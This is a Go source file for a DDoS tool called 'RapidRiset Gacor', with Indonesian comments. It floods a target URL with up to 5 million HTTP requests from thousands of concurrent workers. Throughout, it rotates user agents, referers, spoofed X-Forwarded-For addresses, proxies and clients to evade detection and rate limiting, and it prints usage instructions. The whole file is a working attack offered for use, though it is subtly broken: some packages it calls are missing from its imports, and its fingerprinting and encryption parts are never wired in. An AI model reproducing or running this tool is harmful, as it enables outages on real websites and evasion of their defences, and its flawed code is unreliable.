// main.go - RAPIDRISET GACOR DDOS ENGINE
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"compress/gzip"
	"crypto/cipher"
	"crypto/aes"
	"bytes"
)

// ATTACK CONFIGURATION
const (
	TARGET_REQUESTS = 5000000    // 5 juta request
	ATTACK_DURATION = 200        // 200 detik
	MAX_CONCURRENT  = 5000       // Concurrent connections
	MAX_RETRIES     = 3          // Retry attempts
	REQUEST_TIMEOUT = 10         // Timeout per request
)

// CIPHER SUITES untuk TLS fingerprinting premium
var cipherSuites = []uint16{
	tls.TLS_AES_128_GCM_SHA256,
	tls.TLS_AES_256_GCM_SHA384,
	tls.TLS_CHACHA20_POLY1305_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
	tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
}

// PREMIUM USER-AGENT DATABASE
var userAgents = []string{
	// Chrome Modern
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	
	// Firefox Modern
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:120.0) Gecko/20100101 Firefox/120.0",
	
	// Safari
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	
	// Edge
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	
	// Mobile Agents
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
}

// ACCEPT-LANGUAGE DATABASE
var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-CA,en;q=0.9",
	"en-AU,en;q=0.9",
	"id-ID,id;q=0.9,en;q=0.8",
	"fr-FR,fr;q=0.9,en;q=0.8",
	"de-DE,de;q=0.9,en;q=0.8",
	"ja-JP,ja;q=0.9,en;q=0.8",
	"ko-KR,ko;q=0.9,en;q=0.8",
	"zh-CN,zh;q=0.9,en;q=0.8",
}

// ACCEPT HEADERS DATABASE
var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"application/json, text/plain, */*",
}

// REFERER DATABASE
var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://www.facebook.com/",
	"https://www.twitter.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
	"https://www.youtube.com/",
	"https://www.amazon.com/",
	"https://www.github.com/",
}

// CUSTOM CIPHER ENCRYPTION untuk request obfuscation
type RequestEncryptor struct {
	key []byte
}

func NewRequestEncryptor() *RequestEncryptor {
	key := make([]byte, 32)
	rand.Read(key)
	return &RequestEncryptor{key: key}
}

func (re *RequestEncryptor) EncryptData(data []byte) []byte {
	block, err := aes.NewCipher(re.key)
	if err != nil {
		return data
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return data
	}
	
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	
	return gcm.Seal(nonce, nonce, data, nil)
}

// RAPID FINGERPRINT ROTATION SYSTEM
type FingerprintGenerator struct {
	ja3Strings []string
}

func NewFingerprintGenerator() *FingerprintGenerator {
	return &FingerprintGenerator{
		ja3Strings: []string{
			"771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
			"771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24-25,0",
			"771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21-41,29-23-24,0",
		},
	}
}

func (fg *FingerprintGenerator) GetRandomFingerprint() string {
	return fg.ja3Strings[rand.Intn(len(fg.ja3Strings))]
}

// PROXY MANAGEMENT SYSTEM
type ProxyManager struct {
	proxies []string
	mu      sync.RWMutex
	current int
}

func NewProxyManager(proxyFile string) (*ProxyManager, error) {
	pm := &ProxyManager{}
	
	if proxyFile != "" {
		file, err := os.Open(proxyFile)
		if err != nil {
			return pm, err
		}
		defer file.Close()
		
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxy := strings.TrimSpace(scanner.Text())
			if proxy != "" {
				pm.proxies = append(pm.proxies, proxy)
			}
		}
	}
	
	return pm, nil
}

func (pm *ProxyManager) GetProxy() string {
	pm.mu.RLock()
	defer pm.mu.RUnlock()
	
	if len(pm.proxies) == 0 {
		return ""
	}
	
	pm.current = (pm.current + 1) % len(pm.proxies)
	return pm.proxies[pm.current]
}

// RAPIDRISET ATTACK ENGINE
type RapidRisetAttack struct {
	targetURL     string
	host          string
	port          string
	duration      time.Duration
	proxyManager  *ProxyManager
	stats         *AttackStats
	encryptor     *RequestEncryptor
	fingerprinter *FingerprintGenerator
	stopChan      chan bool
	wg            sync.WaitGroup
}

type AttackStats struct {
	TotalRequests    int64
	SuccessfulReqs   int64
	FailedReqs       int64
	BytesSent        int64
	StartTime        time.Time
	ActiveWorkers    int64
}

func NewRapidRisetAttack(targetURL string, duration int, proxyFile string) (*RapidRisetAttack, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}
	
	host := parsedURL.Hostname()
	port := parsedURL.Port()
	if port == "" {
		if parsedURL.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	
	proxyManager, _ := NewProxyManager(proxyFile)
	
	return &RapidRisetAttack{
		targetURL:     targetURL,
		host:          host,
		port:          port,
		duration:      time.Duration(duration) * time.Second,
		proxyManager:  proxyManager,
		stats:         &AttackStats{},
		encryptor:     NewRequestEncryptor(),
		fingerprinter: NewFingerprintGenerator(),
		stopChan:      make(chan bool),
	}, nil
}

func (r *RapidRisetAttack) GenerateRandomHeaders() http.Header {
	headers := http.Header{}
	
	// Random User-Agent
	headers.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
	
	// Random Accept-Language
	headers.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	
	// Random Accept
	headers.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
	
	// Random Accept-Encoding
	headers.Set("Accept-Encoding", "gzip, deflate, br")
	
	// Random Referer
	headers.Set("Referer", referers[rand.Intn(len(referers))])
	
	// Cache Control
	headers.Set("Cache-Control", "no-cache")
	
	// Pragma
	headers.Set("Pragma", "no-cache")
	
	// Upgrade-Insecure-Requests
	headers.Set("Upgrade-Insecure-Requests", "1")
	
	// Sec-Fetch headers untuk fingerprint modern
	secFetchModes := []string{"navigate", "cors", "no-cors", "same-origin"}
	secFetchSites := []string{"none", "same-origin", "same-site", "cross-site"}
	secFetchUsers := []string{"?0", "?1"}
	
	headers.Set("Sec-Fetch-Mode", secFetchModes[rand.Intn(len(secFetchModes))])
	headers.Set("Sec-Fetch-Site", secFetchSites[rand.Intn(len(secFetchSites))])
	headers.Set("Sec-Fetch-User", secFetchUsers[rand.Intn(len(secFetchUsers))])
	
	// DNT (Do Not Track)
	headers.Set("DNT", strconv.Itoa(rand.Intn(2)))
	
	// Connection
	headers.Set("Connection", "keep-alive")
	
	// Random additional headers untuk diversifikasi
	if rand.Intn(10) > 7 {
		headers.Set("X-Requested-With", "XMLHttpRequest")
	}
	
	if rand.Intn(10) > 5 {
		headers.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d",
			rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	}
	
	return headers
}

func (r *RapidRisetAttack) CreateHTTPClient() *http.Client {
	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
			DualStack: true,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		MaxIdleConnsPerHost:   10,
		MaxConnsPerHost:       0, // Unlimited
		
		TLSClientConfig: &tls.Config{
			CipherSuites:             cipherSuites,
			MinVersion:               tls.VersionTLS12,
			MaxVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			InsecureSkipVerify:       true, // Skip certificate verification
			Renegotiation:            tls.RenegotiateFreelyAsClient,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
				tls.CurveP384,
				tls.CurveP521,
			},
		},
	}
	
	// Set proxy jika ada
	if proxy := r.proxyManager.GetProxy(); proxy != "" {
		proxyURL, err := url.Parse(proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	
	return &http.Client{
		Transport: transport,
		Timeout:   time.Duration(REQUEST_TIMEOUT) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}
}

func (r *RapidRisetAttack) GenerateRandomPath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/index.php",
		"/wp-admin", "/wp-login.php", "/admin", "/login",
		"/api/v1/users", "/api/v2/posts", "/api/v3/data",
		"/search", "/products", "/shop", "/cart", "/checkout",
		"/blog", "/news", "/articles", "/posts", "/feed",
		"/sitemap.xml", "/robots.txt", "/manifest.json",
		"/static/css/main.css", "/static/js/app.js",
		"/images/header.jpg", "/video/preview.mp4",
	}
	
	// Random query parameters
	queryParams := []string{
		"", "?id=" + strconv.Itoa(rand.Intn(10000)),
		"?page=" + strconv.Itoa(rand.Intn(100)),
		"?search=" + generateRandomString(10),
		"?sort=desc&limit=20",
		"?filter=active&category=" + strconv.Itoa(rand.Intn(50)),
	}
	
	basePath := paths[rand.Intn(len(paths))]
	query := queryParams[rand.Intn(len(queryParams))]
	
	return basePath + query
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func (r *RapidRisetAttack) SendRequest(client *http.Client, reqNum int64) {
	defer r.wg.Done()
	
	for {
		select {
		case <-r.stopChan:
			return
		default:
			// Generate random request path
			randomPath := r.GenerateRandomPath()
			fullURL := r.targetURL + randomPath
			
			// Create request
			req, err := http.NewRequest("GET", fullURL, nil)
			if err != nil {
				atomic.AddInt64(&r.stats.FailedReqs, 1)
				continue
			}
			
			// Add random headers
			headers := r.GenerateRandomHeaders()
			for key, values := range headers {
				for _, value := range values {
					req.Header.Add(key, value)
				}
			}
			
			// Add Host header
			req.Host = r.host
			
			// Send request
			startTime := time.Now()
			resp, err := client.Do(req)
			
			atomic.AddInt64(&r.stats.TotalRequests, 1)
			
			if err != nil {
				atomic.AddInt64(&r.stats.FailedReqs, 1)
			} else {
				atomic.AddInt64(&r.stats.SuccessfulReqs, 1)
				
				// Read and close body
				if resp.Body != nil {
					io.Copy(ioutil.Discard, resp.Body)
					resp.Body.Close()
				}
				
				// Calculate bytes sent (approximate)
				reqBytes, _ := httputil.DumpRequest(req, false)
				atomic.AddInt64(&r.stats.BytesSent, int64(len(reqBytes)))
			}
			
			// Rate limiting prevention - random delay
			time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
			
			// Rotate client periodically untuk menghindari deteksi
			if reqNum%100 == 0 {
				client = r.CreateHTTPClient()
			}
		}
	}
}

func (r *RapidRisetAttack) Start() {
	fmt.Println("🔥 RAPIDRISET GACOR ATTACK STARTED 🔥")
	fmt.Printf("🎯 Target: %s\n", r.targetURL)
	fmt.Printf("⏱️  Duration: %v\n", r.duration)
	fmt.Printf("🎯 Target Requests: %d\n", TARGET_REQUESTS)
	
	r.stats.StartTime = time.Now()
	
	// Calculate required RPS (Requests Per Second)
	requiredRPS := TARGET_REQUESTS / ATTACK_DURATION
	workers := MAX_CONCURRENT
	
	fmt.Printf("⚡ Required RPS: %d\n", requiredRPS)
	fmt.Printf("👥 Workers: %d\n", workers)
	
	// Start workers
	for i := 0; i < workers; i++ {
		r.wg.Add(1)
		client := r.CreateHTTPClient()
		go r.SendRequest(client, int64(i))
		atomic.AddInt64(&r.stats.ActiveWorkers, 1)
		
		// Stagger worker starts
		time.Sleep(10 * time.Millisecond)
	}
	
	// Stats printer
	go r.printStats()
	
	// Stop timer
	time.AfterFunc(r.duration, func() {
		close(r.stopChan)
	})
	
	// Wait for all workers
	r.wg.Wait()
	
	// Final stats
	r.printFinalStats()
}

func (r *RapidRisetAttack) printStats() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			elapsed := time.Since(r.stats.StartTime).Seconds()
			total := atomic.LoadInt64(&r.stats.TotalRequests)
			success := atomic.LoadInt64(&r.stats.SuccessfulReqs)
			failed := atomic.LoadInt64(&r.stats.FailedReqs)
			workers := atomic.LoadInt64(&r.stats.ActiveWorkers)
			
			rps := float64(total) / elapsed
			successRate := float64(success) / float64(total) * 100
			
			fmt.Printf("\r📊 Stats: Total=%d | Success=%d (%.1f%%) | Failed=%d | RPS=%.0f | Workers=%d | Time=%.0fs",
				total, success, successRate, failed, rps, workers, elapsed)
				
		case <-r.stopChan:
			return
		}
	}
}

func (r *RapidRisetAttack) printFinalStats() {
	elapsed := time.Since(r.stats.StartTime).Seconds()
	total := atomic.LoadInt64(&r.stats.TotalRequests)
	success := atomic.LoadInt64(&r.stats.SuccessfulReqs)
	bytesSent := atomic.LoadInt64(&r.stats.BytesSent)
	
	rps := float64(total) / elapsed
	successRate := float64(success) / float64(total) * 100
	mbSent := float64(bytesSent) / 1024 / 1024
	
	fmt.Printf("\n\n✅ ATTACK COMPLETED\n")
	fmt.Printf("═══════════════════════════════\n")
	fmt.Printf("📊 Total Requests: %d\n", total)
	fmt.Printf("✅ Successful: %d (%.1f%%)\n", success, successRate)
	fmt.Printf("🚫 Failed: %d\n", atomic.LoadInt64(&r.stats.FailedReqs))
	fmt.Printf("⚡ Average RPS: %.0f\n", rps)
	fmt.Printf("📁 Data Sent: %.2f MB\n", mbSent)
	fmt.Printf("⏱️  Total Time: %.1f seconds\n", elapsed)
	fmt.Printf("🎯 Target Achievement: %.1f%%\n", float64(total)/float64(TARGET_REQUESTS)*100)
	
	if float64(total) >= float64(TARGET_REQUESTS)*0.95 {
		fmt.Printf("\n🎉 SUCCESS: Target 5 juta request tercapai!\n")
	} else {
		fmt.Printf("\n⚠️  WARNING: Target belum tercapai sepenuhnya\n")
	}
}

// MAIN EXECUTION
func main() {
	rand.Seed(time.Now().UnixNano())
	
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./rapidriset <target_url> <duration_seconds> <proxy_file>")
		fmt.Println("Example: ./rapidriset https://example.com 200 proxies.txt")
		os.Exit(1)
	}
	
	targetURL := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	proxyFile := os.Args[3]
	
	if duration > ATTACK_DURATION {
		fmt.Printf("⚠️  Duration reduced to maximum %d seconds\n", ATTACK_DURATION)
		duration = ATTACK_DURATION
	}
	
	attack, err := NewRapidRisetAttack(targetURL, duration, proxyFile)
	if err != nil {
		fmt.Printf("❌ Error: %v\n", err)
		os.Exit(1)
	}
	
	attack.Start()
}